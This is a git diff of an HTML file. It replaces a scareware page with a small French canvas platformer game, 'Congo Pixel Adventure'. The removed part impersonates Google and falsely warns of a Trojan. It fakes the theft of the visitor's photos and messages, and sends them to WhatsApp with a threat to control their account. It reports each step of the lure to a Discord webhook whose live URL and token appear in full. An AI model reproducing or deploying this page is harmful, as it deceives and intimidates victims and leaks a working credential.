@@ -2,83 +2,261 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security - Final Error</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Congo Pixel Adventure</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; overflow: hidden; height: 100vh; font-family: 'Courier New', monospace; }
-        #gate { background: #fff; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 100; position: relative; }
-        .g-btn { background: #d93025; color: #fff; border: none; padding: 18px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #terminal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; color: #0f0; font-size: 8px; padding: 5px; word-break: break-all; opacity: 0.8; line-height: 1; overflow: hidden; }
-        #crack-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9000; pointer-events: none; background-image: url('https://www.transparenttextures.com/patterns/cracked-glass.png'); background-size: cover; filter: invert(1); }
-        
-        /* BLOC ROUGE FINAL MODIFIÉ */
-        #alert-box { 
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            width: 90%; background: #000; color: #f00; border: 5px solid #f00; padding: 20px; text-align: center; z-index: 10000; 
+        body { margin: 0; overflow: hidden; background: #5C94FC; font-family: 'Courier New', Courier, monospace; }
+        canvas { display: block; image-rendering: pixelated; }
+        .ui {
+            position: fixed; top: 10px; width: 100%; text-align: center;
+            color: white; font-size: 18px; font-weight: bold; text-shadow: 2px 2px #000;
+            pointer-events: none; z-index: 20;
         }
-        .crit-bar { background: #f00; color: #000; font-weight: bold; padding: 8px; margin: 10px 0; font-size: 14px; }
-        .wa-btn { background: #25D366; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 15px; font-size: 16px; }
-        .glitch-mode { animation: flashRedBlack 0.04s infinite; }
-        @keyframes flashRedBlack { 0% { background: #f00; } 100% { background: #000; } }
+        .controls {
+            position: fixed; bottom: 15px; width: 100%;
+            display: flex; justify-content: space-around; z-index: 20;
+        }
+        .btn {
+            width: 65px; height: 65px; background: rgba(0,0,0,0.4);
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            color: white; font-weight: bold; user-select: none; border: 2px solid #fff;
+        }
+        #msg { 
+            position: fixed; top: 40%; width: 100%; text-align: center; 
+            color: #ff0; font-size: 25px; display: none; text-shadow: 3px 3px #f00; z-index: 30;
+        }
     </style>
 </head>
 <body>
 
-    <div id="gate">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
-        <h2 style="font-family: sans-serif;">SYSTÈME INFECTÉ</h2>
-        <p style="font-family: sans-serif; color: #5f6368; padding: 0 20px;">Menace Trojan.Cloner détectée.<br>Action requise.</p>
-        <button class="g-btn" onclick="infect()">SUPPRIMER LE VIRUS</button>
+<div class="ui">
+    Score: <span id="score">0</span> / 20 | Épées: <span id="ammo">0</span>
+</div>
+<div id="msg">LE DRAGON EST LÀ !</div>
+
+<div class="controls">
+    <div style="display:flex; gap:5px;">
+        <div class="btn" id="btnLeft">←</div>
+        <div class="btn" id="btnDown">↓</div>
+        <div class="btn" id="btnRight">→</div>
     </div>
+    <div style="display:flex; gap:5px;">
+        <div class="btn" id="btnShoot" style="background:rgba(255,165,0,0.6)">FEU</div>
+        <div class="btn" id="btnJump" style="background:rgba(206,16,33,0.7)">SAUT</div>
+    </div>
+</div>
 
-    <div id="terminal"></div>
-    <div id="crack-overlay"></div>
+<canvas id="game"></canvas>
 
-    <div id="alert-box">
-        <div class="crit-bar">⚠️ TRANSFERT TERMINÉ</div>
-        <p style="color:#fff; font-size: 12px;">VOS DONNÉES PERSONNELLES (PHOTOS, MESSAGES) ONT ÉTÉ ENVOYÉES AU :</p>
-        <h1 style="font-size: 28px; margin: 10px 0;">0819679859</h1>
-        <div class="crit-bar">ACCÈS DISTANT ACTIVÉ</div>
+<script>
+const canvas = document.getElementById("game");
+const ctx = canvas.getContext("2d");
+const scoreDisplay = document.getElementById("score");
+const ammoDisplay = document.getElementById("ammo");
+const msg = document.getElementById("msg");
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+// Images
+const marioImg = new Image();
+marioImg.src = 'drapeau.png'; 
+
+// Variables de jeu
+let score = 0;
+let ammo = 0;
+let gameActive = true;
+let dragonActive = false;
+let dragonHealth = 10;
+const gravity = 0.8;
+
+const player = {
+    x: 50, y: canvas.height - 100, w: 40, h: 40,
+    velX: 0, velY: 0, grounded: false, speed: 5, isSquat: false
+};
+
+const enemies = [];      // Escargots
+const items = [];        // Épées de feu
+const myBullets = [];    // Tes tirs
+const dragonFire = [];   // Tirs du dragon
+
+// Touches
+const keys = {};
+window.addEventListener("keydown", e => keys[e.code] = true);
+window.addEventListener("keyup", e => keys[e.code] = false);
+
+// Tactile
+function bind(id, code) {
+    const el = document.getElementById(id);
+    el.addEventListener("touchstart", (e) => { e.preventDefault(); keys[code] = true; });
+    el.addEventListener("touchend", () => keys[code] = false);
+}
+bind("btnLeft", "ArrowLeft");
+bind("btnRight", "ArrowRight");
+bind("btnJump", "ArrowUp");
+bind("btnDown", "ArrowDown");
+bind("btnShoot", "KeyF");
+
+// Spawn Aléatoire
+function spawnLoop() {
+    if (!gameActive) return;
+    if (!dragonActive) {
+        // Apparition Escargots
+        if (Math.random() < 0.02) enemies.push({ x: canvas.width + 50, y: canvas.height - 70, w: 30, h: 30, speed: 4 });
+        // Apparition Épées de feu
+        if (Math.random() < 0.005) items.push({ x: canvas.width + 50, y: canvas.height - 150, w: 25, h: 25 });
+    }
+    requestAnimationFrame(spawnLoop);
+}
+
+function update() {
+    if (!gameActive) return;
+
+    // Mouvements
+    if (keys["ArrowLeft"]) player.velX = -player.speed;
+    else if (keys["ArrowRight"]) player.velX = player.speed;
+    else player.velX = 0;
+
+    // Saut
+    if (keys["ArrowUp"] && player.grounded) {
+        player.velY = -16;
+        player.grounded = false;
+    }
+
+    // Se Baisser
+    if (keys["ArrowDown"]) {
+        player.isSquat = true;
+        player.h = 25;
+    } else {
+        player.isSquat = false;
+        player.h = 40;
+    }
+
+    // Tir (Touche F ou bouton FEU)
+    if (keys["KeyF"] && ammo > 0) {
+        myBullets.push({ x: player.x + 40, y: player.y + 10, speed: 8 });
+        ammo--;
+        ammoDisplay.innerText = ammo;
+        keys["KeyF"] = false; // Anti-spam
+    }
+
+    player.velY += gravity;
+    player.x += player.velX;
+    player.y += player.velY;
+
+    // Limite Sol
+    if (player.y > canvas.height - 80) {
+        player.y = canvas.height - 80;
+        player.velY = 0;
+        player.grounded = true;
+    }
+
+    // Collision Objets (Épées)
+    items.forEach((it, i) => {
+        it.x -= 3;
+        if (player.x < it.x + it.w && player.x + player.w > it.x && player.y < it.y + it.h && player.y + player.h > it.y) {
+            items.splice(i, 1);
+            ammo += 3;
+            ammoDisplay.innerText = ammo;
+        }
+    });
+
+    // Collision Ennemis
+    enemies.forEach((en, i) => {
+        en.x -= en.speed;
+        if (player.x < en.x + en.w && player.x + player.w > en.x && player.y < en.y + en.h && player.y + player.h > en.y) {
+            gameOver();
+        }
+        if (en.x + en.w < 0) {
+            enemies.splice(i, 1);
+            score++;
+            scoreDisplay.innerText = score;
+            if (score >= 20 && !dragonActive) startDragon();
+        }
+    });
+
+    // Boss Dragon
+    if (dragonActive) {
+        if (Math.random() < 0.03) dragonFire.push({ x: canvas.width - 150, y: 150 + Math.random()*100, speed: 6 });
         
-        <button class="wa-btn" onclick="finalRedirect()">REPRENDRE LE CONTRÔLE</button>
-    </div>
+        myBullets.forEach((b, bi) => {
+            if (b.x > canvas.width - 150) {
+                myBullets.splice(bi, 1);
+                dragonHealth--;
+                if (dragonHealth <= 0) win();
+            }
+        });
+    }
 
-    <script>
-        const webh = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
-
-        function infect() {
-            fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🔥 **PHASE 1 :** La victime a lancé le hack !"}) });
-            document.getElementById('gate').style.display = 'none';
-            document.getElementById('terminal').style.display = 'block';
-
-            let i = 0;
-            const sequence = setInterval(() => {
-                for(let j=0; j<5; j++) {
-                    const l = document.createElement('div');
-                    l.innerText = ">> CLONING_PRIVATE_DATA_0x" + Math.random().toString(16).substring(2,6);
-                    document.getElementById('terminal').appendChild(l);
-                }
-                window.scrollTo(0, document.body.scrollHeight);
-                i++;
-                if(i === 30) document.getElementById('crack-overlay').style.display = 'block';
-                if(i > 80) {
-                    clearInterval(sequence);
-                    document.getElementById('terminal').style.display = 'none';
-                    document.body.classList.add('glitch-mode');
-                    document.getElementById('alert-box').style.display = 'block';
-                }
-            }, 50);
+    dragonFire.forEach((df, di) => {
+        df.x -= df.speed;
+        if (player.x < df.x + 20 && player.x + player.w > df.x && player.y < df.y + 20 && player.y + player.h > df.y) {
+            gameOver();
         }
+    });
 
-        function finalRedirect() {
-            // Message au Discord
-            fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🤡 **PHASE FINALE :** La victime vient vers ton WhatsApp pour s'expliquer !"}) });
+    myBullets.forEach(b => b.x += b.speed);
+}
 
-            // Redirection WhatsApp avec message pré-rempli
-            const monNumero = "243819679859"; // Format international pour la RDC
-            const message = "J'ai maintenant le contrôle de ton compte WhatsApp.;
-            window.location.href = "https://wa.me/" + monNumero + "?text=" + encodeURIComponent(message);
-        }
-    </script>
+function startDragon() {
+    dragonActive = true;
+    msg.style.display = "block";
+    setTimeout(() => msg.style.display = "none", 3000);
+}
+
+function gameOver() { gameActive = false; alert("GAME OVER! Score: " + score); location.reload(); }
+function win() { gameActive = false; alert("VICTOIRE ! Le dragon est vaincu !"); location.reload(); }
+
+function draw() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    // Décors Pixel
+    ctx.fillStyle = "#885418"; ctx.fillRect(0, canvas.height - 40, canvas.width, 40);
+    ctx.fillStyle = "#2ecc71"; ctx.fillRect(0, canvas.height - 50, canvas.width, 10);
+
+    // Joueur
+    ctx.drawImage(marioImg, player.x, player.y, player.w, player.h);
+
+    // Objets (Épées de feu)
+    ctx.fillStyle = "#f1c40f";
+    items.forEach(it => {
+        ctx.fillRect(it.x, it.y, 5, 20); // Lame
+        ctx.fillStyle = "#e67e22"; ctx.fillRect(it.x - 5, it.y + 15, 15, 5); // Garde
+    });
+
+    // Ennemis (Escargots)
+    ctx.fillStyle = "#9b59b6";
+    enemies.forEach(en => {
+        ctx.fillRect(en.x, en.y + 10, 30, 20); // Coquille
+        ctx.fillStyle = "#ecf0f1"; ctx.fillRect(en.x + 20, en.y + 5, 5, 10); // Tête
+    });
+
+    // Tirs Joueur
+    ctx.fillStyle = "orange";
+    myBullets.forEach(b => ctx.fillRect(b.x, b.y, 15, 5));
+
+    // Dragon Boss
+    if (dragonActive) {
+        ctx.fillStyle = "#27ae60"; // Corps Dragon
+        ctx.fillRect(canvas.width - 180, 100, 120, 150);
+        ctx.fillStyle = "red"; ctx.fillRect(canvas.width - 170, 130, 20, 10); // Yeux
+        ctx.fillStyle = "yellow"; ctx.fillRect(canvas.width - 180, 180, 40, 40); // Gueule
+        
+        // Vie Dragon
+        ctx.fillStyle = "black"; ctx.fillRect(canvas.width - 150, 50, 100, 10);
+        ctx.fillStyle = "red"; ctx.fillRect(canvas.width - 150, 50, dragonHealth * 10, 10);
+
+        ctx.fillStyle = "red";
+        dragonFire.forEach(df => {
+            ctx.beginPath(); ctx.arc(df.x, df.y, 12, 0, Math.PI*2); ctx.fill();
+        });
+    }
+
+    requestAnimationFrame(() => { update(); draw(); });
+}
+
+draw();
+spawnLoop();
+</script>
 </body>
 </html>
